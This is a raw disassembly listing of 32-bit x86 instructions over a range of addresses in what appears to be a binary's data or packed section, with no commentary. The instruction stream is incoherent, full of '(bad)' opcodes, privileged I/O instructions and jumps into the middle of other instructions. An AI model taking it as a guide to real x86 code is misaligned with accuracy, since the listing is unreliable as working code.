  40444d:	xor    DWORD PTR [esi+0x53],esi
  404450:	mov    ch,0xa5
  404452:	mov    ah,0xc4
  404454:	mov    dl,0x59
  404456:	jg     0x4043e4
  404458:	or     al,0x38
  40445a:	cmp    BYTE PTR [edi],dh
  40445c:	jbe    0x4043ee
  40445e:	out    0x11,al
  404460:	popa   
  404461:	and    al,0xfa
  404463:	sbb    ebp,ebx
  404465:	pushw  ds
  404467:	add    ah,BYTE PTR [si]
  40446a:	sbb    edx,esp
  40446c:	jb     0x40447e
  40446e:	in     eax,dx
  40446f:	inc    edx
  404470:	popf   
  404471:	xchg   DWORD PTR [ecx+eax*1-0x45a333e1],ebx
  404478:	or     cl,BYTE PTR [ebp+0x3dcd4461]
  40447e:	jmp    0x4044e8
  404480:	lods   eax,DWORD PTR ds:[esi]
  404481:	xlat   BYTE PTR ds:[ebx]
  404482:	adc    eax,0x218bd1c9
  404487:	ins    BYTE PTR es:[edi],dx
  404488:	or     DWORD PTR [ebx],0xf8013b0a
  40448e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40448f:	adc    DWORD PTR [edx-0x70],esi
  404492:	hlt    
  404493:	xchg   ecx,eax
  404494:	jl     0x4044a1
  404496:	shl    BYTE PTR [eax],cl
  404498:	sbb    al,0x98
  40449a:	inc    ecx
  40449b:	in     eax,0xa2
  40449d:	outs   dx,BYTE PTR ds:[esi]
  40449e:	adc    al,0xbe
  4044a0:	shl    eax,0x80
  4044a3:	sbb    al,0xa4
  4044a5:	outs   dx,BYTE PTR ds:[esi]
  4044a6:	jl     0x4044da
  4044a8:	mov    edi,0x5b8fa703
  4044ad:	inc    eax
  4044ae:	test   al,0xa8
  4044b0:	mov    ecx,DWORD PTR [eax]
  4044b2:	pop    edx
  4044b3:	push   esi
  4044b4:	(bad)  
  4044b5:	les    edi,FWORD PTR [ebx-0x41]
  4044b8:	sub    DWORD PTR [ebp-0x71],esp
  4044bb:	mov    WORD PTR [edi+0x2bedb5a1],gs
  4044c1:	xchg   edi,eax
  4044c2:	pusha  
  4044c3:	cld    
  4044c4:	sub    ebp,DWORD PTR [eax]
  4044c6:	loope  0x404457
  4044c8:	add    eax,0x368fd7b0
  4044cd:	jb     0x40448c
  4044cf:	iret   
  4044d0:	dec    ebx
  4044d1:	add    al,0xb0
  4044d3:	push   ss
  4044d4:	pop    edx
  4044d5:	sar    BYTE PTR [ecx],1
  4044d7:	dec    ecx
  4044d8:	test   edx,ecx
  4044da:	mov    ebp,gs
  4044dc:	not    DWORD PTR [eax]
  4044de:	xchg   BYTE PTR [ebx-0x574469ba],dl
  4044e4:	adc    BYTE PTR [ebx],dh
  4044e6:	jmp    0x40449d
  4044e8:	enter  0xadca,0x65
  4044ec:	neg    BYTE PTR [ecx]
  4044ee:	cmp    DWORD PTR [ebx-0x39208ae1],edx
  4044f4:	fcomp  QWORD PTR [ecx+0xd]
  4044f7:	mov    ebp,0xa7dde9f
  4044fc:	lods   eax,DWORD PTR ds:[esi]
  4044fd:	push   ds
  4044fe:	out    0x89,eax
  404500:	xchg   DWORD PTR [edx+ebp*4+0x29],eax
  404504:	nop
  404505:	xchg   edx,eax
  404506:	mov    al,ds:0x126ac33f
  40450b:	push   edi
  40450c:	dec    edx
  40450d:	fmul   DWORD PTR [ebp+0x78]
  404510:	pop    edx
  404511:	and    esi,DWORD PTR [ecx]
  404513:	push   ebx
  404514:	sub    eax,0x7fa4ea1c
  404519:	mov    eax,ds:0xfba1ea83
  40451e:	syscall 
  404520:	loop   0x404595
  404522:	fld    TBYTE PTR [eax+edx*4-0x16]
  404526:	xchg   edx,eax
  404527:	aam    0x2
  404529:	add    al,bh
  40452b:	js     0x4044f0
  40452d:	push   cs
  40452e:	jbe    0x4044f6
  404530:	xchg   ebx,eax
  404531:	js     0x404533
  404533:	mov    ah,0x80
  404535:	sbb    eax,0xc90c024d
  40453a:	mov    edx,0xc84b9714
  40453f:	call   0x6b8a:0xd80d4c
  404546:	aam    0x84
  404548:	cmp    dl,0x1d
  40454b:	aad    0xfc
  40454d:	dec    ebx
  40454e:	inc    edx
  40454f:	retf   
  404550:	scas   al,BYTE PTR es:[edi]
  404551:	push   cs
  404552:	test   BYTE PTR [eax-0x35],cl
  404555:	scas   eax,DWORD PTR es:[edi]
  404556:	sar    DWORD PTR [eax+ebx*2],1
  404559:	daa    
  40455a:	pop    ss
  40455b:	push   ebx
  40455c:	inc    esi
  40455d:	(bad)  
  40455e:	out    0xf5,eax
  404560:	mov    al,ds:0xa9e63b0e
  404565:	jnp    0x404515
  404567:	fs sub al,0xb6
  40456a:	and    DWORD PTR [eax+esi*1+0x1b9c51b5],ebx
  404571:	mov    ebp,0xb4f83810
  404576:	fdiv   st,st(3)
  404578:	mov    esi,0xe83e82c2
  40457d:	outs   dx,WORD PTR ds:[esi]
  40457f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404580:	adc    al,BYTE PTR [ebx+0x37077aff]
  404586:	aad    0xb1
  404588:	enter  0xa1a8,0x43
  40458c:	outs   dx,BYTE PTR ds:[esi]
  40458d:	jnp    0x40456c
  40458f:	stc    
  404590:	pusha  
  404591:	mov    edx,0x273f812c
  404596:	adc    BYTE PTR es:[esi+ecx*1+0x1],ah
  40459b:	outs   dx,DWORD PTR ds:[esi]
  40459c:	sti    
  40459d:	sub    BYTE PTR [edx-0xb],dh
  4045a0:	xchg   edx,eax
  4045a1:	mov    al,0x72
  4045a3:	xchg   ebx,eax
  4045a4:	cmp    al,0xe8
  4045a6:	push   0xffffffd7
  4045a8:	jp     0x4045d1
  4045aa:	nop
  4045ab:	sti    
  4045ac:	inc    esi
  4045ad:	mov    eax,0x68659bcc
  4045b2:	mov    ebx,0x60f6e682
  4045b7:	hlt    
  4045b8:	sub    edi,eax
  4045ba:	mov    ?,WORD PTR [esi]
  4045bc:	test   eax,0x7d70f4ef
  4045c1:	outs   dx,DWORD PTR ds:[esi]
  4045c2:	outs   dx,BYTE PTR ds:[esi]
  4045c3:	mov    ds:0x2b673dd6,eax
  4045c8:	and    eax,0x34c89d7
  4045cd:	repz mov cl,0x36
  4045d0:	push   DWORD PTR [ebp+eiz*1-0x29]
  4045d4:	pop    eax
  4045d5:	mov    al,0x57
  4045d7:	xor    dh,BYTE PTR [ecx]
  4045d9:	dec    esi
  4045da:	imul   DWORD PTR [ebp-0xb]
  4045dd:	cmp    eax,0xb1ed17d7
  4045e2:	push   ds
  4045e3:	jp     0x4045fc
  4045e5:	dec    esi
  4045e6:	fwait
  4045e7:	mov    fs,WORD PTR [esi+0x4a488538]
  4045ed:	push   0xffffffab
  4045ef:	xchg   ecx,eax
  4045f0:	(bad)  
  4045f1:	jno    0x4045d0
  4045f3:	push   es
  4045f4:	pop    esi
  4045f5:	mov    al,0x79
  4045f7:	loop   0x4045c1
  4045f9:	or     cl,BYTE PTR ds:0xfd2f8030
  4045ff:	sub    eax,0x1173263
  404604:	pop    edi
  404605:	xor    BYTE PTR [edi],cl
  404607:	push   0x1c
  404609:	bound  ecx,QWORD PTR [ebx-0x1e]
  40460c:	push   0x52
  40460e:	mov    dh,0x4e
  404610:	add    ah,BYTE PTR [edx]
  404612:	cdq    
  404613:	aas    
  404614:	lock add esi,DWORD PTR [eax-0xefa4225]
  40461b:	aam    0x60
  40461d:	inc    eax
  40461e:	inc    BYTE PTR [esi+edi*8+0x45a7aa8]
  404625:	mov    DWORD PTR [esi-0x48be405a],ebx
  40462b:	jge    0x40464f
  40462d:	adc    bh,BYTE PTR [edx]
  40462f:	mov    ah,BYTE PTR [edi+0xe90330b]
  404635:	icebp  
  404636:	add    BYTE PTR [eax+0x4fd4c2c2],bh
  40463c:	es push 0x3c4df999
  404642:	inc    edi
  404643:	dec    edi
  404644:	inc    dh
  404646:	call   0xa350:0x99756efd
  40464d:	js     0x404627
  40464f:	cli    
  404650:	test   BYTE PTR ds:0x8f422f62,dl
  404656:	cli    
  404657:	(bad)  
  404658:	and    eax,0x94350934
  40465d:	mov    cl,0xa8
  40465f:	hlt    
  404660:	dec    edx
  404661:	and    esi,DWORD PTR [ebx+0xa]
  404664:	mov    al,0x96
  404666:	inc    esp
  404667:	dec    esp
  404668:	xor    ch,BYTE PTR [esi-0x746fa1ed]
  40466e:	mov    bh,0x4f
  404670:	jae    0x4046be
  404672:	pop    es
  404673:	ror    ecx,0x79
  404676:	xchg   edi,eax
  404677:	shl    DWORD PTR [edi-0x30ab1722],0x5f
  40467e:	into   
  40467f:	outs   dx,BYTE PTR ds:[esi]
  404680:	dec    ebx
  404681:	popa   
  404682:	cmp    eax,0xe14f68e
  404687:	cmovno ebp,DWORD PTR [ecx]
  40468a:	push   edx
  40468b:	xchg   ebp,eax
  40468c:	dec    esp
  40468d:	out    dx,al
  40468e:	das    
  40468f:	mov    ds:0x861eb819,al
  404694:	mov    edx,0xcdf84e33
  404699:	aam    0x4c
  40469b:	add    DWORD PTR [edx],ebx
  40469d:	dec    edx
  40469e:	cld    
  40469f:	xor    edi,eax
  4046a1:	lea    esp,[ebp-0x6ca25292]
  4046a7:	add    edx,DWORD PTR ds:0xdfd940ef
  4046ad:	bound  ecx,QWORD PTR [ebx+ecx*2+0x5f]
  4046b1:	aam    0x81
  4046b3:	mov    eax,0xa431d332
  4046b8:	jno    0x40465b
  4046ba:	cmp    BYTE PTR [esi],dl
  4046bc:	into   
  4046bd:	push   edx
  4046be:	rcl    BYTE PTR ds:0x7c719f37,1
  4046c4:	clc    
  4046c5:	xor    eax,0x5f836711
  4046ca:	and    al,0x6a
  4046cc:	jge    0x404689
  4046ce:	cmp    al,0x98
  4046d0:	jmp    0x404707
  4046d2:	mov    dh,0xd9
  4046d4:	and    DWORD PTR [edx+ecx*4-0x34],edx
  4046d8:	cmp    BYTE PTR [eax+0x3e],ah
  4046db:	aad    0x54
  4046dd:	sub    eax,0x7503a10e
  4046e2:	add    edi,DWORD PTR [esi-0x17]
  4046e5:	addr16 dec esi
  4046e7:	pop    ebx
  4046e8:	in     al,dx
  4046e9:	push   cs
  4046ea:	and    cl,BYTE PTR [ebx+eax*8]
  4046ed:	fst    QWORD PTR [edx]
  4046ef:	pop    ds
  4046f0:	xchg   BYTE PTR [ecx+0x5c],dh
  4046f3:	xchg   ebx,eax
  4046f4:	(bad)  
  4046f5:	push   esp
  4046f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046f7:	and    DWORD PTR [esi-0x7],esp
  4046fa:	(bad)  
  4046fc:	data16 sbb al,0x44
  4046ff:	loope  0x40471c
  404701:	xlat   BYTE PTR ds:[ebx]
  404702:	popa   
  404703:	cmp    BYTE PTR [edx],ch
  404705:	xchg   DWORD PTR [edx+0x4f251303],eax
  40470b:	popf   
  40470c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40470d:	xlat   BYTE PTR ds:[ebx]
  40470e:	sbb    esp,DWORD PTR [ecx]
  404710:	aam    0x3e
  404712:	adc    al,0x47
  404714:	retf   
  404715:	pop    es
  404716:	imul   edi,DWORD PTR [edi+0x29b2ce85],0x116d38a2
  404720:	jg     0x404718
  404722:	test   al,0x84
  404724:	aas    
  404725:	(bad)  
  404726:	mov    al,0x9e
  404728:	add    DWORD PTR [ecx],esi
  40472a:	cmovp  edx,DWORD PTR [esi-0x1b]
  40472e:	sbb    eax,0xa0d32c07
  404733:	pop    ebp
  404734:	or     eax,0xe2a1350c
  404739:	pusha  
  40473a:	in     al,0x99
  40473c:	jge    0x4046e1
  40473e:	lahf   
  40473f:	push   0xc9c3c99b
  404744:	gs mov dl,0xec
  404747:	mov    WORD PTR [ebx],?
  404749:	dec    esp
  40474a:	push   ds
  40474b:	xchg   ecx,eax
  40474c:	lds    ebp,FWORD PTR [edx-0x3886108c]
  404752:	adc    edi,DWORD PTR [esi+0x1a598b9c]
  404758:	imul   eax,DWORD PTR [esi+0x588c4059],0xe13d4cc1
  404762:	pop    ss
  404763:	mov    DWORD PTR [edi+0x178ad525],esp
  404769:	mov    bl,0x6b
  40476b:	dec    esi
  40476c:	pop    es
  40476d:	and    eax,0x31054696
  404772:	lods   eax,DWORD PTR ds:[esi]
  404773:	test   BYTE PTR [eax],dh
  404775:	push   ds
  404776:	dec    edi
  404777:	inc    edx
  404778:	out    dx,eax
  404779:	push   ebx
  40477a:	vmread DWORD PTR [edi-0x70961e70],ecx
  404781:	jecxz  0x40476e
  404783:	add    al,0xa6
  404785:	xchg   BYTE PTR [edi],dl
  404787:	pusha  
  404788:	jp     0x4047db
  40478a:	sub    ch,ch
  40478c:	pop    esp
  40478d:	push   es
  40478e:	mov    ah,BYTE PTR [edx+ecx*4]
  404791:	jne    0x40476c
  404793:	cld    
  404794:	add    ah,bh
  404796:	iret   
  404797:	pop    eax
  404798:	push   ebx
  404799:	pop    es
  40479a:	out    dx,eax
  40479b:	jns    0x40477f
  40479d:	in     eax,dx
  40479e:	cdq    
  40479f:	jae    0x404779
  4047a1:	mov    cs,WORD PTR [edx-0x500794e]
  4047a7:	call   DWORD PTR [edi+0x4b]
  4047aa:	xchg   ebx,eax
  4047ab:	stc    
  4047ac:	jno    0x4047d4
  4047ae:	outs   dx,BYTE PTR ds:[esi]
  4047af:	stos   DWORD PTR es:[edi],eax
  4047b0:	ss jge 0x4047b4
  4047b3:	mov    ebp,0x5537c412
  4047b8:	push   ds
  4047b9:	adc    DWORD PTR [edi-0x60dc9a41],edx
  4047bf:	cmc    
  4047c0:	mov    ebx,0x6d05b65
  4047c5:	aaa    
  4047c6:	or     al,0x1
  4047c8:	pop    ds
  4047c9:	mov    ds:0xd98fdbe1,al
  4047ce:	in     eax,0x32
  4047d0:	sbb    dh,bl
  4047d2:	or     al,0xc8
  4047d4:	xchg   edi,eax
  4047d5:	or     BYTE PTR [eax-0x1af92730],dl
  4047db:	stc    
  4047dc:	iret   
  4047dd:	dec    ebp
  4047de:	ins    BYTE PTR es:[edi],dx
  4047df:	lods   al,BYTE PTR ds:[esi]
  4047e0:	ja     0x4047d4
  4047e2:	imul   ebp,esp,0xffffffa9
  4047e5:	mov    eax,0x9caa21eb
  4047ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047eb:	xchg   ecx,eax
  4047ec:	and    BYTE PTR [ecx+edi*8],0xdf
  4047f0:	sbb    DWORD PTR [ebx-0x33],edx
  4047f3:	aad    0x69
  4047f5:	(bad)  
  4047f6:	icebp  
  4047f7:	ret    0x9d34
  4047fa:	push   ds
  4047fb:	xchg   ebp,eax
  4047fc:	daa    
  4047fd:	inc    edi
  4047fe:	sbb    edx,DWORD PTR [edi-0x12]
  404801:	push   ebx
  404802:	pop    edx
  404803:	std    
  404804:	or     esi,DWORD PTR cs:[ebx]
  404807:	pop    ecx
  404808:	and    ebp,DWORD PTR [eax+eiz*8-0x45f950d0]
  40480f:	je     0x404791
  404811:	jecxz  0x404825
  404813:	mov    ecx,0xb355ad73
  404818:	fstp   TBYTE PTR [ebx-0x253d7baf]
  40481e:	dec    BYTE PTR [eax+0x41124118]
  404824:	int    0x87
  404826:	jns    0x404880
  404828:	(bad)  
  404829:	fdiv   DWORD PTR [edi]
  40482b:	jmp    0xd96a33b5
  404830:	pop    edx
  404831:	mov    ds:0x7eb4cdbb,eax
  404836:	push   esi
  404837:	mov    DWORD PTR [eax-0x3],edx
  40483a:	fst    st(1)
  40483c:	in     al,dx
  40483d:	xor    cl,BYTE PTR [edx-0x7fd7bb73]
  404843:	push   ebx
  404844:	add    al,BYTE PTR [eax+edi*8]
  404847:	(bad)  
  404848:	mov    ebx,0x358b777a
  40484d:	sbb    al,0x70
  40484f:	ss test eax,0x183f978
  404855:	dec    esi
  404856:	mov    dh,0x44
  404858:	repz ret 0xd4ed
  40485c:	mov    DWORD PTR ds:0x3923383d,0xcbb11978
  404866:	ret    
  404867:	mov    esp,0x7af1a14d
  40486c:	mov    BYTE PTR [ebx+0x14],bh
  40486f:	leave  
  404870:	adc    BYTE PTR ds:0x5dd3e3ef,cl
  404876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404878:	ins    DWORD PTR es:[edi],dx
  404879:	inc    eax
  40487a:	dec    esp
  40487b:	clc    
  40487c:	inc    ebx
  40487d:	adc    eax,0xe2c6871a
  404882:	and    al,0x93
  404884:	inc    edi
  404885:	sub    eax,0x7620b437
  40488a:	je     0x40487b
  40488c:	jno    0x4048fb
  40488e:	gs ret 0x4583
  404892:	fild   QWORD PTR [edx+0x74b6c605]
  404898:	dec    esp
  404899:	jno    0x40489f
  40489b:	or     eax,0xaff304e5
  4048a0:	cwde   
  4048a1:	or     BYTE PTR [eax-0x292e0de8],ch
  4048a7:	sar    DWORD PTR ds:0x1be96d6f,cl
  4048ad:	int3   
  4048ae:	fcom   st(4)
  4048b0:	sti    
  4048b1:	loop   0x4048b6
  4048b3:	push   ss
  4048b4:	and    DWORD PTR [edi+0x78463345],eax
  4048ba:	xor    eax,0xf5b018d
  4048bf:	fs in  eax,dx
  4048c1:	mov    bl,0xd6
  4048c3:	add    eax,0x1e35c560
  4048c8:	mov    al,0x3f
  4048ca:	lock das 
  4048cc:	test   eax,0x64a2c62d
  4048d1:	jno    0x4048ef
  4048d3:	jmp    0x40493e
  4048d5:	mov    DWORD PTR [esi],ecx
  4048d7:	ss jmp 0x40489e
  4048da:	mov    edx,0x403c25c0
  4048df:	pop    ss
  4048e0:	mov    ebp,0x58aba927
  4048e5:	enter  0x5b8,0xe0
  4048e9:	cmp    al,cl
  4048eb:	fmul   QWORD PTR [eax+0x6e1635b1]
  4048f1:	in     eax,dx
  4048f2:	jmp    0x404898
  4048f4:	mov    cl,BYTE PTR [eax+0x2fff189f]
  4048fa:	clc    
  4048fb:	into   
  4048fc:	popa   
  4048fd:	pop    edx
  4048fe:	(bad)  
  404901:	push   ss
  404902:	pop    ebp
  404903:	lahf   
  404904:	mov    dh,0xb5
  404906:	sbb    ecx,esp
  404908:	out    dx,al
  404909:	inc    ebx
  40490a:	adc    BYTE PTR cs:[eax],bh
  40490d:	mov    eax,0xc3e46ee7
  404912:	test   eax,0x44529c59
  404917:	sbb    esp,DWORD PTR [edx+0x59]
  40491a:	ja     0x404970
  40491c:	xchg   edx,eax
  40491d:	mov    ebx,0xd1668824
  404922:	pop    es
  404923:	and    BYTE PTR [ecx],dl
  404925:	jne    0x40490d
  404927:	mov    eax,0x7d385645
  40492c:	aad    0xc4
  40492e:	sbb    al,0xab
  404930:	fnstcw WORD PTR [eax-0x68]
  404933:	(bad)  
  404934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404935:	push   ebx
  404936:	into   
  404937:	out    dx,al
  404938:	iret   
  404939:	rcl    dl,1
  40493b:	dec    eax
  40493c:	and    eax,0x3598fb68
  404941:	push   esi
  404942:	pop    ebp
  404943:	jne    0x404983
  404945:	out    0xc0,eax
  404947:	in     eax,dx
  404948:	mov    ss,WORD PTR ds:0x9b0be28
  40494e:	mov    ds:0x5f545ae5,eax
  404953:	test   eax,0xbee85ad6
  404958:	mov    ecx,0xa59042ac
  40495d:	ror    DWORD PTR [esp+esi*2],1
  404960:	sbb    ah,al
  404962:	fwait
  404963:	and    al,0x44
  404965:	aad    0xc0
  404967:	mov    WORD PTR [ebx],ss
  404969:	wrmsr  
  40496b:	fucomip st,st(7)
  40496d:	into   
  40496e:	cli    
  40496f:	cdq    
  404970:	cmp    al,0x97
  404972:	add    al,0x50
  404974:	mov    ebp,0x7493810b
  404979:	enter  0xb076,0xdb
  40497d:	pop    esp
  40497e:	pop    edi
  40497f:	jmp    0x5965ae35
  404984:	cmc    
  404985:	inc    eax
  404986:	mov    bl,0xe
  404988:	aas    
  404989:	fwait
  40498a:	pushf  
  40498b:	mov    al,0xfb
  40498d:	aad    0xef
  40498f:	mov    ds:0xe43d3633,eax
  404994:	dec    esp
  404995:	dec    ecx
  404996:	jl     0x404a03
  404998:	mov    ds:0xf5a52b5a,al
  40499d:	mov    ds:0xccef1275,al
  4049a2:	jecxz  0x404953
  4049a4:	jmp    ebx
  4049a6:	scas   al,BYTE PTR es:[edi]
  4049a7:	cli    
  4049a8:	retf   
  4049a9:	pop    ds
  4049aa:	mov    ebx,0x2c0262d1
  4049af:	sub    al,0xcc
  4049b1:	jle    0x4049fe
  4049b3:	xchg   ebx,eax
  4049b4:	sub    al,0x9c
  4049b6:	pop    edx
  4049b7:	ficom  WORD PTR [esi-0x3b]
  4049ba:	loop   0x404a0a
  4049bc:	in     eax,0xfc
  4049be:	sar    BYTE PTR [eax],1
  4049c0:	adc    al,0x95
  4049c2:	dec    edx
  4049c3:	and    ch,BYTE PTR [edi-0x2aa88377]
  4049c9:	push   0xffffff97
  4049cb:	push   edx
  4049cc:	retf   0xda0d
  4049cf:	in     al,0x2f
  4049d1:	mov    esp,0x2ba0cefc
  4049d6:	fiadd  WORD PTR [eax+0x6f]
  4049d9:	jl     0x4049d6
  4049db:	and    al,0x62
  4049dd:	mov    dl,0x3f
  4049df:	data16 stc 
  4049e1:	imul   edi,DWORD PTR [edx-0x57],0x29593acd
  4049e8:	jmp    0x404970
  4049ea:	and    ch,BYTE PTR [ecx-0x42]
  4049ed:	adc    dh,BYTE PTR [edi]
  4049ef:	aaa    
  4049f0:	ret    0x5ed1
  4049f3:	outs   dx,BYTE PTR ds:[esi]
  4049f4:	clc    
  4049f5:	call   0x464b24c1
  4049fa:	lds    esi,FWORD PTR [edi+0x946ca07]
  404a00:	aad    0x14
  404a02:	inc    esi
  404a03:	(bad)  
  404a04:	xor    BYTE PTR [edx-0x477236ce],dh
  404a0a:	lods   eax,DWORD PTR ds:[esi]
  404a0b:	aam    0x15
  404a0d:	push   ebx
  404a0e:	push   edx
  404a0f:	sbb    eax,0x5213dd77
  404a14:	int    0x98
  404a16:	stos   DWORD PTR es:[edi],eax
  404a17:	loope  0x40499b
  404a19:	cli    
  404a1a:	test   eax,0x5b0be6
  404a1f:	adc    eax,0xc7d7aae7
  404a24:	pop    ds
  404a25:	or     eax,ebx
  404a27:	pop    es
  404a28:	scas   eax,DWORD PTR es:[edi]
  404a29:	repz sub DWORD PTR [eax+0x32],ebx
  404a2d:	aam    0xac
  404a2f:	pop    ebp
  404a30:	xchg   edi,eax
  404a31:	sti    
  404a32:	jb     0x404a82
  404a34:	call   0xfeb7:0x11f985b7
  404a3b:	mov    BYTE PTR [eax-0x47192cd1],dl
  404a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a42:	clc    
  404a43:	and    al,0x91
  404a45:	jne    0x4049db
  404a47:	dec    edi
  404a48:	scas   eax,DWORD PTR es:[edi]
  404a49:	or     esi,0xfffffff6
  404a4c:	push   cs
  404a4d:	dec    ecx
  404a4e:	xchg   edi,eax
  404a4f:	retf   
  404a50:	push   0xdc691278
  404a55:	mov    eax,0xaeddebe9
  404a5a:	out    0x82,eax
  404a5c:	mov    esi,0x7716fa77
  404a61:	sub    BYTE PTR [eax+0x16],ah
  404a64:	mov    cl,0x60
  404a66:	mov    fs,WORD PTR [edi-0x4be51b70]
  404a6c:	or     bh,BYTE PTR [eax+eiz*4+0xd]
  404a70:	sahf   
  404a71:	mov    bl,0x3d
  404a73:	jno    0x404acf
  404a75:	adc    ecx,edx
  404a77:	mov    eax,ds:0xf696a6be
  404a7c:	outs   dx,DWORD PTR ds:[esi]
  404a7d:	adc    al,0x3c
  404a7f:	(bad)  
  404a80:	fisub  WORD PTR ds:0xfa333596
  404a86:	in     al,dx
  404a87:	jmp    0x404a9c
  404a89:	or     bh,ch
  404a8b:	adc    ebp,edx
  404a8d:	je     0x404adc
  404a8f:	out    dx,eax
  404a90:	push   edi
  404a91:	lds    ebp,FWORD PTR [ecx-0x211d26af]
  404a97:	inc    esi
  404a98:	das    
  404a99:	(bad)  
  404a9a:	dec    ecx
  404a9b:	jmp    0x404a92
  404a9d:	mov    BYTE PTR [ecx+0x10],ch
  404aa0:	pop    ecx
  404aa1:	rol    DWORD PTR [edx+esi*8+0x2949178],1
  404aa8:	sbb    DWORD PTR [edi+0x69476a6a],esi
  404aae:	mov    ah,0x67
  404ab0:	mov    ebx,0xcf821eb
  404ab5:	cmp    ebp,esp
  404ab7:	das    
  404ab8:	test   DWORD PTR [edx],ecx
  404aba:	dec    ebp
  404abb:	aas    
  404abc:	mov    dl,0xbf
  404abe:	ja     0x404abd
  404ac0:	imul   BYTE PTR [eax+0x15c5758]
  404ac6:	rcr    DWORD PTR ds:0x73e46a98,1
  404acc:	shl    BYTE PTR [edx],1
  404ace:	dec    edi
  404acf:	daa    
  404ad0:	dec    esp
  404ad1:	repz test al,0x36
  404ad4:	or     ch,BYTE PTR [edi+ebx*1-0x338a4635]
  404adb:	clc    
  404adc:	sub    esi,DWORD PTR [ebx-0x50]
  404adf:	leave  
  404ae0:	clc    
  404ae1:	loop   0x404b07
  404ae3:	adc    dh,BYTE PTR [edi+0x50]
  404ae6:	aam    0x22
  404ae8:	mov    dh,BYTE PTR [eax]
  404aea:	mov    bl,0xd5
  404aec:	daa    
  404aed:	in     eax,dx
  404aee:	xchg   esp,eax
  404aef:	inc    eax
  404af0:	retf   0x7105
  404af3:	mov    ecx,0x591e950b
  404af8:	pop    ds
  404af9:	push   ebx
  404afa:	mov    ah,0x65
  404afc:	cmp    BYTE PTR [ecx-0x1c],0x40
  404b00:	scas   eax,DWORD PTR es:[edi]
  404b01:	adc    cl,dh
  404b03:	aaa    
  404b04:	ror    ebx,0x93
  404b07:	cmp    BYTE PTR [ecx+0x4e33b054],dl
  404b0d:	bnd fs call 0xde4737bc
  404b14:	leave  
  404b15:	das    
  404b16:	push   ds
  404b17:	mov    bh,0x29
  404b19:	or     ebp,0xfffffff6
  404b1c:	test   BYTE PTR [ebp-0x4a946995],cl
  404b22:	(bad)  
  404b23:	fst    DWORD PTR [eax]
  404b25:	into   
  404b26:	jo     0x404b90
  404b28:	out    dx,al
  404b29:	dec    eax
  404b2a:	enter  0xf33a,0x89
  404b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b2f:	push   0x55df0457
  404b34:	mov    al,0x77
  404b36:	test   al,0xfc
  404b38:	ins    DWORD PTR es:[edi],dx
  404b39:	aad    0x47
  404b3b:	add    BYTE PTR [ecx-0x5cc30604],bl
  404b41:	mov    bh,0xf3
  404b43:	or     al,BYTE PTR [ebx]
  404b45:	scas   eax,DWORD PTR es:[edi]
  404b46:	test   eax,0xbc38ca2f
  404b4b:	mov    cl,0x43
  404b4d:	stos   DWORD PTR es:[edi],eax
  404b4e:	in     eax,dx
  404b4f:	mov    ecx,0xe13c2ac6
  404b54:	xchg   DWORD PTR [ebx-0x796acc0b],ebp
  404b5a:	add    bh,BYTE PTR [eax]
  404b5c:	pop    ebx
  404b5d:	cli    
  404b5e:	in     eax,dx
  404b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b60:	lock or al,0x71
  404b63:	ds aas 
  404b65:	fwait
  404b66:	mov    edx,DWORD PTR [ecx-0x74]
  404b69:	daa    
  404b6a:	pop    eax
  404b6b:	mov    ebp,DWORD PTR [ecx+0x4c]
  404b6e:	es cs add eax,0x6d3c11e6
  404b75:	xchg   DWORD PTR [ebp-0x3484affc],esi
  404b7b:	jp     0x404b22
  404b7d:	repz loopne 0x404b26
  404b80:	mov    bh,0xb8
  404b82:	and    DWORD PTR [edi-0x4f],esi
  404b85:	push   esp
  404b86:	dec    edi
  404b87:	popa   
  404b88:	sub    DWORD PTR [edx-0x3],ebx
  404b8b:	clc    
  404b8c:	or     esi,DWORD PTR [eax]
  404b8e:	jp     0x404b54
  404b90:	cmp    edx,DWORD PTR [ebx]
  404b92:	sbb    eax,0x4a6be1f5
  404b97:	retf   0x2b18
  404b9a:	and    eax,0xa3e7d07b
  404b9f:	sbb    dh,BYTE PTR [ebp-0x7b]
  404ba2:	shl    DWORD PTR [esi+0x2ff65b7f],1
  404ba8:	sahf   
  404ba9:	mov    BYTE PTR [ecx+ebx*4+0x42],dl
  404bad:	mov    esi,0x78f69000
  404bb2:	add    eax,0xbc86924e
  404bb7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  404bb9:	dec    edx
  404bba:	mov    WORD PTR [esi],cs
  404bbc:	lods   al,BYTE PTR ds:[esi]
  404bbd:	add    DWORD PTR [eax+0x617539fe],edx
  404bc3:	retf   
  404bc4:	aad    0x1d
  404bc6:	inc    esp
  404bc7:	cmp    al,0x34
  404bc9:	rcr    DWORD PTR [ebx],0x88
  404bcc:	sti    
  404bcd:	adc    eax,0x87df3250
  404bd2:	imul   edi,DWORD PTR [esi],0x1370bb12
  404bd8:	shl    DWORD PTR [ecx+0x69042d28],cl
  404bde:	bound  ecx,QWORD PTR [edx-0x1f16daec]
  404be4:	leave  
  404be5:	lds    ebx,FWORD PTR [esi-0x66]
  404be8:	ins    BYTE PTR es:[edi],dx
  404be9:	mov    DWORD PTR [edi+0x6785fc27],esp
  404bef:	mov    eax,0x98239b0a
  404bf4:	idiv   DWORD PTR [edi+0x72894236]
  404bfa:	jecxz  0x404b9e
  404bfc:	jecxz  0x404bf9
  404bfe:	cmp    al,0xa4
  404c00:	mov    esi,0x18f645da
  404c05:	inc    edi
  404c06:	lahf   
  404c07:	push   edi
  404c08:	iret   
  404c09:	and    dh,0x8e
  404c0c:	jns    0x404bb3
  404c0e:	jle    0x404c5c
  404c10:	inc    ecx
  404c11:	add    esi,DWORD PTR [esi+0x264c4ad6]
  404c17:	cmp    al,0xd6
  404c19:	cmp    esi,DWORD PTR [edx-0x1d]
  404c1c:	retf   0x36ef
  404c1f:	push   edi
  404c20:	pop    edi
  404c21:	xchg   ebx,eax
  404c22:	inc    ebx
